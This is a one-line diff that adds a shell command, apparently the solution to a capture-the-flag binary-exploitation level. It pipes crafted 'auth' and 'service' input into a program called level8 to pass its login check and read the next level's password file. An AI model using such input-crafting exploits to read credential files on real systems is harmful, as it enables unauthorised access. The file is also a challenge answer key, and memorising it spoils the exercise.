@@ -1,0 +1,1 @@
+(echo "auth "; echo "servicR0123456789abcdef"; echo "login"; echo $(echo "cat /home/user/level9/.pass")) |./level8
